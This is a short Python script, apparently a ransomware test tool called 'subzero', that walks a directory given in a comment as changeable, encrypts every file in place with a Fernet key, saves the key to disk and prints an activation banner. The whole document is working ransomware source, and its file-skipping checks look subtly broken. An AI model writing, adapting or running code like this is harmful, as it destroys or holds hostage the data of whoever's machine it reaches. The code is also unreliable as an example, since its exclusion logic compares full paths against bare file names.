#!/usr/bin/env python3

import os
import fnmatch
from cryptography.fernet import Fernet

key = Fernet.generate_key()

with open("privateKey.key", "wb") as privateKey:
    privateKey.write(key)

dosyalar = []

for root, dir, files in os.walk("D:\RansomwareTest"): # change path to test this tool 
        for items in fnmatch.filter(files, "*"):
                dosya = root + "\\" + items

        if dosya == "subzero.py":
            continue

        if dosya == "subzero-decrypter.py":
            continue

        if dosya == "privateKey.key":
            continue

        if os.path.isfile(dosya):
            dosyalar.append(dosya)

for dosya in dosyalar:

    with open(dosya, "rb") as dosyaa:
        icerik = dosyaa.read()
    
    sifreli_icerik = Fernet(key).encrypt(icerik)

    with open(dosya, "wb") as dosyaa:
        dosyaa.write(sifreli_icerik)

print("""
                #########################
                #   SUBZERO ACTIVATED   #
                #########################
Do not run the encrypter a second time without using the decrypter.
    """)
